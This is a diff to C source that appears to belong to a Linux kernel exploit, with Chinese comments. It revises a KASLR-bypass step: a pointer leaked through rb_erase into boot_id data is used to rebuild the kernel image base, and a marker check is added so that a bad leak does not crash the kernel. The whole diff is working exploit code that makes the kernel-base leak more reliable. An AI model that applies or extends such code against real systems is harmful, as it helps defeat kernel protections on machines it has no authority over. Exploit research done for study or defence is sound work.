@@ -945,8 +945,16 @@ uint64_t slide_read_stext(void) {
     return 0;
   }
 
-  uint64_t off = p0_alias_image_offset(SLIDE_NFULNL_LOGGER);
-  uint64_t stext = leaked - off;
+  /*
+   * rb_erase 将 tree_pc (SLIDE_LOGGERS_0_1 的 P0 alias 地址) 写入
+   * boot_id 数据的前 8 字节。P0 alias 不受 KASLR 影响,因此 leaked 值
+   * 是固定的。通过以下公式重建内核镜像基址:
+   *   stext = leaked - off + (KIMAGE_TEXT_BASE - P0_PAGE_OFFSET - P0_KERNEL_PHYS_DELTA)
+   * 当 slide=0 时, stext == KIMAGE_TEXT_BASE。
+   */
+  uint64_t off = p0_alias_image_offset(SLIDE_LOGGERS_0_1);
+  uint64_t stext =
+      leaked - off + (KIMAGE_TEXT_BASE - P0_PAGE_OFFSET - P0_KERNEL_PHYS_DELTA);
   pr_success("slide boot_id_leaked_nfulnl_logger pid=%d value=%016llx stext=%016llx\n",
              getpid(), (unsigned long long)leaked, (unsigned long long)stext);
   pr_success("slide boot_id-derived_stext pid=%d value=%016llx\n",
@@ -1096,13 +1104,21 @@ int slide_leak_kernel_base(void) {
     cleanup_page_prepare_children();
     cleanup_page_prepare_state();
 
-    kaslr_base = stext;
-    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
-    kaslr_done = 1;
-    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
+    /* boot_id stext 重建是 slide-independent 的(当 slide=0 时
+     * stext == KIMAGE_TEXT_BASE)。只有 marker 匹配时才设置 kaslr_base,
+     * 防止写入失败时用垃圾值污染 kaslr_base 导致后续 panic。 */
+    bool bootid_marker_ok = (stext == KIMAGE_TEXT_BASE);
+    if (!kaslr_done && bootid_marker_ok) {
+      kaslr_base = stext;
+      kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
+      kaslr_done = 1;
+    }
+    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx "
+               "bootid_marker=%s\n",
                getpid(), (unsigned long long)kaslr_base,
-               (unsigned long long)kaslr_slide);
-    return 1;
+               (unsigned long long)kaslr_slide,
+               bootid_marker_ok ? "MATCH" : "MISS");
+    return kaslr_done ? 1 : 0;
   }
 
   return 0;
